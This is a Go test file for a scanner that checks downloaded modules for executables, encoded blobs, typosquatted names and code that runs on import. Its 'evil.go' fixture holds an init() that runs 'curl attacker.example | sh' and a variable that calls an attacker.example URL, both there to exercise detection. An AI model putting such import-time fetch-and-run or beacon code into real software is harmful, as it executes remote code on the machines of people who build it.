package scan

import (
	"archive/zip"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writeZip(t *testing.T, prefix string, files map[string]string) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "m.zip")
	f, err := os.Create(p)
	if err != nil {
		t.Fatal(err)
	}
	zw := zip.NewWriter(f)
	for name, body := range files {
		w, _ := zw.Create(prefix + name)
		w.Write([]byte(body))
	}
	zw.Close()
	f.Close()
	return p
}

func TestZip(t *testing.T) {
	blob := strings.Repeat("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=", 600)
	files := map[string]string{
		"go.mod":               "module example.com/m\n",
		"bin/helper":           "\x7fELF\x02\x01\x01",
		"testdata/fixture.exe": "MZ\x90\x00",
		"assets/plugin.wasm":   "\x00asm\x01",
		"image.png":            "\x89PNG\r\n",
		"safe.go": `package m

import "os/exec"

// Run is fine: it only runs when the caller asks.
func Run() error { return exec.Command("true").Run() }
`,
		"evil.go": `package m

import (
	x "os/exec"
	"net/http"
)

var beacon, _ = http.Get("https://attacker.example/collect")

func init() {
	x.Command("sh", "-c", "curl attacker.example | sh").Start()
}
`,
		"payload.go": "package m\n\nconst payload = \"" + blob + "\"\n",
		"evil_test.go": `package m

import "os/exec"

func init() { exec.Command("go", "version").Run() }
`,
	}
	findings, err := Zip(writeZip(t, "example.com/m@v1.0.0/", files), "example.com/m@v1.0.0/")
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]Finding{}
	for _, f := range findings {
		got[f.Rule+" "+f.File] = f
	}
	want := map[string]Severity{
		"executable bin/helper":           Block,
		"executable testdata/fixture.exe": Warn,
		"executable assets/plugin.wasm":   Warn,
		"runs-on-import evil.go":          Warn,
		"encoded-blob payload.go":         Warn,
	}
	for key, sev := range want {
		if f, ok := got[key]; !ok || f.Severity != sev {
			t.Errorf("%s: got %+v, want severity %s", key, f, sev)
		}
	}
	runsOnImport := 0
	for _, f := range findings {
		if f.Rule == "runs-on-import" {
			runsOnImport++
			if f.File != "evil.go" {
				t.Errorf("flagged %s: %s", f.File, f)
			}
		}
	}
	if runsOnImport != 2 {
		t.Errorf("%d runs-on-import findings, want 2 (the aliased exec in init and http.Get in a var):\n%v", runsOnImport, findings)
	}
	if !strings.Contains(got["runs-on-import evil.go"].Message, "os/exec.Command") && !strings.Contains(findingsText(findings), "os/exec.Command") {
		t.Errorf("messages don't name the call:\n%s", findingsText(findings))
	}
	if !Blocked(findings) {
		t.Error("an executable outside testdata doesn't block")
	}

	clean, err := Zip(writeZip(t, "example.com/m@v1.0.0/", map[string]string{"go.mod": "module example.com/m\n", "safe.go": files["safe.go"]}), "example.com/m@v1.0.0/")
	if err != nil || len(clean) != 0 {
		t.Errorf("clean module: %v, %v", clean, err)
	}
}

func findingsText(fs []Finding) string {
	var b strings.Builder
	for _, f := range fs {
		b.WriteString(f.String() + "\n")
	}
	return b.String()
}

func TestTyposquat(t *testing.T) {
	popular := []string{"alice/backoff-retry"}
	for name, rule := range map[string]string{
		"gin-gonlc/gin":       "typosquatting", // one substitution from gin-gonic/gin
		"stretchr/tesitfy":    "typosquatting", //nolint:misspell // swapped letters, on purpose
		"stretchr/testify":    "impersonation",
		"alice/backof-retry":  "typosquatting", // a popular module here
		"alice/retry":         "",
		"bob/gin":             "", // too short to judge
		"alice/backoff-retry": "", // itself
	} {
		fs := Typosquat(name, popular)
		switch {
		case rule == "" && len(fs) > 0:
			t.Errorf("%s: unexpected %v", name, fs)
		case rule != "" && (len(fs) == 0 || fs[0].Rule != rule):
			t.Errorf("%s: got %v, want %s", name, fs, rule)
		}
	}
	if d := distance("kitten", "sitting"); d != 3 {
		t.Errorf("distance = %d", d)
	}
}

func TestZipHidingPlaces(t *testing.T) {
	huge := "package m\n\n// " + strings.Repeat("padding ", (maxGoFile/8)+10) + "\nfunc init() {}\n"
	files := map[string]string{
		"go.mod":                  "module example.com/m\n",
		"rsrc_windows_amd64.syso": "\x64\x86\x02\x00", // a COFF object: no executable header
		"lib/helper.o":            "\x7fELF-ish but renamed",
		"testdata/fixture.syso":   "\x64\x86",
		"generated.go":            huge,
		"small.go":                "package m\n",
	}
	findings, err := Zip(writeZip(t, "example.com/m@v1.0.0/", files), "example.com/m@v1.0.0/")
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]string{}
	for _, f := range findings {
		got[f.File] = f.Rule + "/" + string(f.Severity)
	}
	for file, want := range map[string]string{
		"rsrc_windows_amd64.syso": "object-file/warn",
		"generated.go":            "unscanned/warn",
	} {
		if got[file] != want {
			t.Errorf("%s: %q, want %q (all: %v)", file, got[file], want, got)
		}
	}
	if _, ok := got["testdata/fixture.syso"]; ok {
		t.Error("testdata objects are fixtures, not linked into builds")
	}
	if _, ok := got["small.go"]; ok {
		t.Error("a clean file was flagged")
	}
	if got["lib/helper.o"] == "" {
		t.Error("an object file was missed")
	}
}
